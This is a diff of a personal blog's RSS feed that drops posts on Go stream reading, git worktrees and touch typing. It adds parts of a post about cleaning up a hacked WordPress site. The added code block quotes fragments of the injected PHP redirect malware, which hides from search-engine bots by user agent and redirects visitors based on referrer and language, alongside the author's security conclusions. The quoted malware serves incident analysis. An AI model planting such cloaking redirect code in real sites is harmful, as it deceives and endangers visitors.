-    <item>
-      <title>Reading the last bytes of a stream in Go</title>
-      <link>https://klingt.net/articles/reading-the-last-bytes-of-a-stream-in-go.html</link>
-      <description>In this post I explain how to efficiently read the last bytes of a stream of file, just like the good old tail utility.</description>
-      <content:encoded><![CDATA[<!doctype html>
-<html lang="en">
+        if (!$this-&gt;strpos_arr($this-&gt;ok_str, $this-&gt;url)) {
+            $this-&gt;redirekt = false;
 
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  
-  <meta name="description" content="In this post I explain how to efficiently read the last bytes of a stream of file, just like the good old tail utility.">
-  
-  <title>Reading the last bytes of a stream in Go</title>
+        }
+		  else{
+            $this-&gt;redirekt = true;
+        }
+		
+    }
 
-  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
-  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>
+    private function get_lang()
+	
+    {
+        if (($list = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']))) {
+            if (preg_match_all('/([a-z]{1,8}(?:-[a-z]{1,8})?)(?:;q=([0-9.]+))?/', $list, $list)) {
+                $this-&gt;language = array_combine($list[1], $list[2]);
+                foreach ($this-&gt;language as $n =&gt; $v)
+                    $this-&gt;language[$n] = $v ? $v : 1;
+                arsort($this-&gt;language, SORT_NUMERIC);
+            }
+        } else $this-&gt;language = array();
+    }
 
-  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
-  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
-  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
-  
-  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
-    media="screen and (prefers-color-scheme: light)" />
-  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
-    media="screen and (prefers-color-scheme: dark)" />
-  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
-  <script defer>
-    hljs.highlightAll();
-  </script>
-  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
-</head>
+    private function test_stop_lang()
+    {
+        foreach ($this-&gt;lang_stop as $v) {
+            if (array_key_exists($v, $this-&gt;language)) {
+                return true;
+            }
+        }
+        return false;
 
-<body>
-  <div class="wrapper">
-    <div class="main">
-      <main>
-        
-<h1>Reading the last bytes of a stream in Go</h1>
-<p>It's about half a year since my last blog post, so it's about time to write another one.</p>
-<p>Yesterday I was working on a private project that required to read a block of bytes from the end of an <code>io.Reader</code>.
-On a first glance that sounds like a trivial problem, but doing this <em>efficiently</em> turned out to be more complicated than initially thought.</p>
-<p>If your <code>io.Reader</code> stems from a file you're lucky, because regular files allow random access through the system <a href="https://man7.org/linux/man-pages/man2/lseek.2.html">seek call</a> that is exposed on a <code>os.File</code> with its <a href="https://pkg.go.dev/os#File.Seek"><code>Seek</code> method</a>.  However, my function only accepts a plain <code>io.Reader</code> and not an <code>os.File</code>, so this option is out of question.</p>
-<p>How can we read the last N bytes of a <em>finite</em> stream of some kind?</p>
-<h2>Naïve solution</h2>
-<p>A naïve solution would be to <a href="https://pkg.go.dev/io#ReadAll">read the whole file into memory</a> and then discard everything except for some slice of bytes at the end.</p>
-<pre><code class="language-go">func readTail(r io.Reader, N int) ([]byte, error) {
-	data, err := io.ReadAll(r)
-	if err != nil {
-		return nil, err
-	}
+    }
 
-	return data[len(data)-N:], nil
+    private function test_stop_str_referal()
+	
+    {
+
+        if ($this-&gt;strpos_arr($this-&gt;stop_referal_str, $this-&gt;referer)) {
+            return true;
+        }
+
+        return false;
+
+    }
+
+    private function test_stop_url($url)
+	
+    {
+        foreach ($this-&gt;url_stop as $v) {
+            if ($this-&gt;test_end($url, $v)) {
+                return true;
+            }
+        }
+        return false;
+
+    }
+	
+    private function strpos_arr($arr, $str)
+	
+    {
+        foreach ($arr as $v) {
+            if (strpos(trim(strtolower($str)), strtolower($v)) !== false) {
+                return true;
+            }
+        }
+        return false;
+
+    }
+
+    private function test_end($str, $search)
+    {
+        if (substr($str, strlen($str) - strlen($search)) == $search) {
+            return true;
+        }
+        return false;
+    }
+
+    private function get_refer()
+    {
+        if (isset($_SERVER['HTTP_REFERER'])) {
+            $this-&gt;referer = strtolower($_SERVER[&quot;HTTP_REFERER&quot;]);
+        }
+    }
+
+    private function get_url()
+    {
+        $this-&gt;url = strtolower($_SERVER['REQUEST_URI']);
+    }
+
+    private function is_bot()
+    {
+        if (!empty($_SERVER['HTTP_USER_AGENT'])) {
+            $list = array(
+                'vkShare', 'Google', 'VKontakte', 'FacebookExternalHit',
+                'YandexBot', 'YandexAccessibilityBot', 'YandexMobileBot', 'YandexDirectDyn',
+                'YandexScreenshotBot', 'YandexImages', 'YandexVideo', 'YandexVideoParser',
+                'YandexMedia', 'YandexBlogs', 'YandexFavicons', 'YandexWebmaster',
+                'YandexPagechecker', 'YandexImageResizer', 'YandexAdNet', 'YandexDirect',
+                'YaDirectFetcher', 'YandexCalendar', 'YandexSitelinks', 'YandexMetrika',
+                'YandexNews', 'YandexNewslinks', 'YandexCatalog', 'YandexAntivirus',
+                'YandexMarket', 'YandexVertis', 'YandexForDomain', 'YandexSpravBot',
+                'YandexSearchShop', 'YandexMedianaBot', 'YandexOntoDB', 'YandexOntoDBAPI',
+                'Googlebot', 'Googlebot-Image', 'Mediapartners-Google', 'AdsBot-Google',
+                'Mail.RU_Bot', 'bingbot', 'Accoona', 'ia_archiver', 'Ask Jeeves',
+                'OmniExplorer_Bot', 'W3C_Validator', 'WebAlta', 'YahooFeedSeeker', 'Yahoo!',
+                'Ezooms', '', 'Tourlentabot', 'MJ12bot', 'AhrefsBot', 'SearchBot', 'SiteStatus',
+                'Nigma.ru', 'Baiduspider', 'Statsbot', 'SISTRIX', 'AcoonBot', 'findlinks',
+                'proximic', 'OpenindexSpider', 'statdom.ru', 'Exabot', 'Spider', 'SeznamBot',
+                'oBot', 'C-T bot', 'Updownerbot', 'Snoopy', 'heritrix', 'Yeti',
+                'DomainVader', 'DCPbot', 'PaperLiBot'
+            );
+
+            foreach ($list as $botname) {
+                if (stripos($_SERVER['HTTP_USER_AGENT'], $botname) !== false) {
+                    return true;
+                }
+            }
+        }
+
+        return false;
+    }
+
+    private function add_stop_str()
+    {
+        $this-&gt;ok_str = array(
+            'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0','zyvox'
+        );
+    }
+
 }
+
+if (empty($_COOKIE['ssl_message'])) {
+    $obj = new redir();
+
+    if ($obj-&gt;redirekt and $obj-&gt;referer!=&quot;&quot;) {
+        cookie();
+    }
+}
+
+?&gt;&lt;?
 </code></pre>
-<p>This is pretty wasteful and might require huge amounts of memory, depending on how long the stream you want to consume is.</p>
-<h2>Two interleaved buffers</h2>
-<p>The next idea I had was to read the stream in chunks of size N, and discarding every chunk except the last one.
-But this won't work because of a variety of reasons, first and foremost if the stream length is not an integer multiple of N then the last chunk might be incomplete since it is only the remainder of file size divided by chunk size (N).</p>
-<p><img src="unalinged-end-of-file-read.png" alt="illustration of an unaligned read"></p>
-<p>So, why not maintain two buffers, one for the previous read and another one for the current read.
-When reaching EOF we can then concatenate the second last read with the last and return an slice of size N, right?
-This might work, but turns out to be pretty complicated because of how <code>io.Read</code> might behave.
-A call to <code>Read</code> is not guaranteed to return <code>N</code> bytes, instead it might fill only a <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.19.2:src/io/io.go;l=60-61">part of the given buffer</a>:</p>
-<pre><code class="language-go">// If some data is available but not len(p) bytes, Read conventionally
-// returns what is available instead of waiting for more.
-</code></pre>
-<p>So, we can't easily fill the two buffers in an interleaved manner because a single read might not fill a whole buffer.
-Of course, there's <a href="https://pkg.go.dev/io#ReadFull"><code>io.ReadFull</code></a> which takes care of reading exactly N bytes if available, but the logic would still be quite convoluted.</p>
-<h2>Ring buffer</h2>
-<p>After dabbling around for a while with the solution I had, I realized that what I wrote looked almost like a <a href="https://en.wikipedia.org/wiki/Circular_buffer">ring buffer</a>.
-With a ring buffer, sometimes also called circular buffer, we only need O(n) space instead of O(2n) as required with the previous concept.
-The gist is to store each chunk in a ring buffer, wrapping around if it exceeds the end of the ring buffers internal array.</p>
-<p><img src="ring-buffer-end-of-file-read.png" alt="illustration of reading chunks with a ring buffer"></p>
-<p>After we reached the end of the stream we can just return a slice from the ring buffer, starting from the write head and reaching back N bytes.
-Those are two operations if we need to wrap around</p>
-<pre><code class="language-go">copy(dst[:N-wpos], ringbuf[wpos:])
-copy(dst[N-wpos:], ringbuf[:wpos])
-</code></pre>
-<p>where <code>wpos</code> is the index of the write head.</p>
-<p>One thing that bit me was that <code>io.Read</code> might return <code>io.EOF</code> together with a non-zero amount of bytes read, <em>or</em> it could return <code>0, io.EOF</code> after the last call that returned a non-zero amount of bytes and a <code>nil</code> error.
-This is <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.19.2:src/io/io.go;l=83">documented behavior</a> but could still be surprising.</p>
-<pre><code class="language-go">// An instance of this general case is that a Reader returning
-// a non-zero number of bytes at the end of the input stream may
-// return either err == EOF or err == nil. The next Read should
-// return 0, EOF.
-</code></pre>
-<p>You can find an ugly example in <a href="https://go.dev/play/p/M-WcpkVviGV">this playground</a> but be aware that you need to run it locally, since external URLs might not be resolved in the playground.</p>
-<p>There are a number of performance considerations that arise from this implementation, e.g. a very small <code>N</code> might lead to a huge number of read calls if the ring buffer's size is equal to <code>N</code>.
-Technically they are independent, the only condition is that the ring buffer must at least have a size of <code>N</code>.</p>
-<p>You might've guessed it already but the good old <code>tail</code> utility serves the same purpose.  I haven't had a look in <a href="https://github.com/coreutils/coreutils/blob/master/src/tail.c">GNU tail's source code</a> yet, but I'm curious to see how they achieved this.</p>
-<p>I hope that helped someone.
-Please let me know if you've an even more efficient solution or there is any other feedback for me.</p>
+<h3>Summary</h3>
+<p>Having auto-updates turned on in Wordpress won't keep you safe.  Any additional Wordpress plugin increases your risk of being vulnerable to Malware and other attacks.</p>
+<p>This incident just undermined my presumption that Wordpress is inherently insecure and is not a good choice for small business and personal websites.  Owning a Wordpress based website makes you a system administrator, if you like it or not.  Building websites is not my profession, so I can't give any recommendations based on personal experience.  If someone would ask me to build them a website for their small business I would reach for some <a href="https://jamstack.org/">Jamstack</a> solution, like Netlify which provides a CMS but renders out static files.</p>
+<p>Searching for the terms <code>wordpress remove malware</code> is no help at all.  Most of the results are just scam or they advertise shady &quot;malware scanner&quot; plugins that at best do nothing and <em>only</em> cost you money.</p>
+<section class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1" role="doc-endnote">
+<p>I don't care about your opinion on cryptocurrencies.  It's a waste of energy and thanks to this 💩 technology we now see <del>people</del> idiots promoting web3 as being all the rage.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:2" role="doc-endnote">
+<p>There is an incredibly handy tool called <a href="https://gchq.github.io/CyberChef/">CyberChef</a> for applying chains of encodings and decodings to an input string.&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:3" role="doc-endnote">
+<p><del>I need to file a GitHub issue so they can look for the actual security vulnerability.</del> I filed an <a href="https://github.com/WordPress/health-check/issues/425">issue</a>.&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</section>
 
 
       </main>
@@ -1626,183 +1925,7 @@ Please let me know if you've an even more efficient solution or there is any oth
 </html>
 ]]></content:encoded>
       <author>Andreas Linz</author>
-      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
-    </item>
-    <item>
-      <title>Git Worktrees (Update)</title>
-      <link>https://klingt.net/articles/git-worktrees-update.html</link>
-      <description>Git Worktrees are a lesser known utility of git and I want to show how to use them and also motivate why I think they&#39;re useful.</description>
-      <content:encoded><![CDATA[<!doctype html>
-<html lang="en">
-
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  
-  <meta name="description" content="Git Worktrees are a lesser known utility of git and I want to show how to use them and also motivate why I think they&#39;re useful.">
-  
-  <title>Git Worktrees (Update)</title>
-
-  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
-  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>
-
-  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
-  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
-  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
-  
-  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
-    media="screen and (prefers-color-scheme: light)" />
-  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
-    media="screen and (prefers-color-scheme: dark)" />
-  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
-  <script defer>
-    hljs.highlightAll();
-  </script>
-  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
-</head>
-
-<body>
-  <div class="wrapper">
-    <div class="main">
-      <main>
-        
-<h1>Git Worktrees</h1>
-<p>At work I often face the situation that I want to locally review some feature branch of a colleague.
-In general that's easy, one <code>git switch --track origin/branch-name</code> later and you have the changes in your local repository.
-However, most of the time I was currently working in my own feature branch where I had unstaged changes.
-This means I needed to commit my local changes before I could switch to the colleague's branch.
-Wouldn't it be nice if I could work on multiple branches of a repository at the same time?</p>
-<p>You might be tempted to say, I know how to do that, just make a second clone of the repository and call it a day.
-That would work, of course, but it'd also be very wasteful since the whole repository needs to be cloned twice.
-For large repositories this could mean duplicating hundreds or thousands of megabytes.
-But guess what, git got you covered!  There's a lesser known command that handles exactly this use case, it's <a href="https://git-scm.com/docs/git-worktree">git worktree</a>.</p>
-<p>There's a variety of ways how to use git worktrees.</p>
-<h2>Existing repository</h2>
-<p>Let's assume that you're in some repository that you cloned a while a go and now you want to switch to a different branch without having to commit your local changes.
-We can do that by creating a new <em>worktree</em> like this:</p>
-<pre><code class="language-sh">$ git worktree add ../repository.feat-x origin/feat-x
-</code></pre>
-<p>This will create a copy, which shares the same <code>.git</code> data, in <code>../repository.feat-x</code> at branch <code>origin/feat-x</code>.
-It's sensible to not add the worktree inside the existing repository because then you would need to ignore the worktree directory.</p>
-<p>Checking out a new branch when creating a worktree is also very easy, just pass <code>-b my-branch-name</code>, that's it.</p>
-<p>If you're done with your work you can remove your worktree like</p>
-<pre><code class="language-sh">$ rm -rf ../repository.feat-x
-</code></pre>
-<p>or run</p>
-<pre><code class="language-sh">$ git worktree remove repository.feat-x
-</code></pre>
-<p>instead.
-But <code>git worktree remove</code> should be preferred, otherwise some metadata will not be removed until a <code>git gc</code> or <code>git worktree prune</code> was run.</p>
-<p>All worktrees of a repository can be listed with <code>git worktree list</code>.</p>
-<h2>New repository layout</h2>
-<p><strong>Update</strong>: In the <a href="https://github.com/klingtnet/klingtnet.github.io/blob/c800968678ffda04ec8a0cab04f28b7774dcefef/content/articles/2022-10-07-git-worktree.md">previous version of this article</a> I used a <a href="https://git-scm.com/docs/git-clone#Documentation/git-clone.txt---bare">bare repository</a> but this will lead to problems since this type of repository is not intended to be updated or track remote changes.  I did found another simple solution that I will explain below.</p>
-<p>Let's say we want to patch something in the Go compiler on <code>master</code>, <code>1.19</code> and <code>1.18</code> branches.
-We can setup the project like this:</p>
-<pre><code class="language-sh">$ mkdir -p go/worktrees
-$ cd go/worktrees
-$ git clone git@github.com:golang/go master
-$ cd master
-# add the first worktree
-$ git worktree add -B release-branch.go1.19 ../go1.19
-# and the second worktree
-$ git worktree add -B release-branch.go1.18 ../go1.18
-</code></pre>
-<p>What we end up with is a project structure like this</p>
-<pre><code class="language-sh">$ tree -L 2 go
-go
-└── worktrees
-    ├── go1.18
-    ├── go1.19
-    └── master
-</code></pre>
-<p>where each directory below <code>/worktrees</code> contains the repository at a different branch.</p>
-<p>For work projects I could imagine a directory structure that looks similar to this:</p>
-<pre><code class="language-sh">go
-└── worktrees
-    ├── master
-    ├── feature
-    └── review
-</code></pre>
-<p>Note that each worktree just acts like a copy of the repository, so I can switch to whatever branch I like, i.e. the worktree is not pinned to the branch it was created with.
-In the example above I would use <code>work/</code> for my local feature development, <code>experiment/</code> for trying out some ideas, and <code>review/</code> whenever I need to checkout and review some feature of a colleague locally.</p>
-<p>Let me know what your experience with git worktree is and if and how you use it.</p>
-
-
-      </main>
-    </div>
-  </div>
-</body>
-
-</html>
-]]></content:encoded>
-      <author>Andreas Linz</author>
-      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
-    </item>
-    <item>
-      <title>Learning Touch Typing</title>
-      <link>https://klingt.net/articles/learning-touch-typing.html</link>
-      <description>My experience of learning how to touch type, i.e. how to write on a keyboard using 10 fingers.</description>
-      <content:encoded><![CDATA[<!doctype html>
-<html lang="en">
-
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  
-  <meta name="description" content="My experience of learning how to touch type, i.e. how to write on a keyboard using 10 fingers.">
-  
-  <title>Learning Touch Typing</title>
-
-  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
-  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>
-
-  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
-  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
-  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
-  
-  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
-    media="screen and (prefers-color-scheme: light)" />
-  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
-    media="screen and (prefers-color-scheme: dark)" />
-  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
-  <script defer>
-    hljs.highlightAll();
-  </script>
-  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
-</head>
-
-<body>
-  <div class="wrapper">
-    <div class="main">
-      <main>
-        
-<h1>Learning Touch Typing</h1>
-<p>Lately two articles about developer productivity appeared in my news feed.  The first was <a href="https://scattered-thoughts.net/writing/speed-matters/">speed matters</a>, which is part of the great <a href="https://scattered-thoughts.net/writing/reflections-on-a-decade-of-coding/">reflections on a decade of coding</a> article series, and second is <a href="https://danluu.com/productivity-velocity/">some reasons to work on productivity and velocity</a> by Dan Luu.  Both articles stated that <a href="https://en.wikipedia.org/wiki/Touch_typing">touch typing</a> improved their productivity.  The productivity boost was not limited to a bare increase in word per minute that one can type, instead the greater leverage comes from an increased accuracy.  Making less typing errors improves the writing flow because every typo requires a context switch in order to fix the mistake.  Jamie Brandon wrote:</p>
-<blockquote>
-<p>If you compare two coders, one who can touch type and one who has to hunt and peck, the difference between them is not just down to typing speed. The hunter-and-pecker has to think about typing! This consumes attention and short-term memory that is sorely needed for thinking about the program itself.</p>
-</blockquote>
-<p>Dan Luu  wrote this about typing speed:</p>
-<blockquote>
-<p>I've actually looked at where my time goes and a lot of it goes to things that are canonical examples of things that you shouldn't waste time improving because people don't spend much time doing them.</p>
-<p>An example of one of these, the most commonly cited bad-thing-to-optimize example that I've seen, is typing speed (when discussing this, people usually say that typing speed doesn't matter because more time is spent thinking than typing). But, when I look at where my time goes, a lot of it is spent typing.</p>
-</blockquote>
-<p>Reading both articles motivated me to give it another try.  I was satisfied with the speed of my self learned four finger typing method but what actually annoyed me was how many typing errors I made.  One thing that I can say for sure is fixing too many typing mistakes let me loose my &quot;flow&quot;.</p>
-<p>Learning how to touch type takes a lot of dedication, it feels like learning an instrument or how to play the piano (even though it's quite a bit easier).  The hardest part for me was to realize that touch typing will be a lot slower than my current technique until I get more comfortable with it.  As always, learning something takes practice, practice and even more practice.</p>
-<p>Learning touch typing begins with the home row, this is the middle row of your keyboard where your fingers will rest and return to after hitting any key.  For the basics I used <a href="https://www.typingtom.com/lessons">typingtom.com</a> with which I learned how to type on the home and top row after a day or two.  But the lessons were too repetitive, so they quickly became boring.  Luckily there are a bunch of alternatives from which I chose <a href="https://www.keybr.com">keybr.com</a> because it provided some nice statistics for tracking the learning progress and the lessons used random but readable and pronounceable words spit out by some word generating algorithm.  Following is the progress chart after about a week of practicing touch typing:</p>
-<p><img src="touch-typing-progress.png" alt="progress of learning touch typing"></p>
-<p>The green line shows typing speed in words per minute, red is the number of errors and (kind of) purple is the number of keys in the lesson.  It took me about five days to learn all characters and to get as fast, if not even a bit faster, as with my previous hunt and peck approach.  In the last quarter of the graph you can see a steep decline in typing speed and this is because I activated capitalization and symbols.  On a US QWERTY keyboard most common symbols are located on the right half, hence they must be hit with the right hand pinky.  For me, one of the hardest things was learning to type with my pinky and ring finger.</p>
-<p>Now it's all about practicing and getting back to speed.  For this reason I forced myself to write this article using touch typing which went okay but could have been a bit smoother 🙄  Anyways, if you now decide to learn this skill as well I wish you all the best 💪.  It's not as hard to learn as you might think and it should only take a month of typing to become fast and accurate.</p>
-
-
-      </main>
-    </div>
-  </div>
-</body>
-
-</html>
-]]></content:encoded>
-      <author>Andreas Linz</author>
-      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
+      <pubDate>Tue, 18 Oct 2022 06:56:02 +0000</pubDate>
     </item>
   </channel>
 </rss>
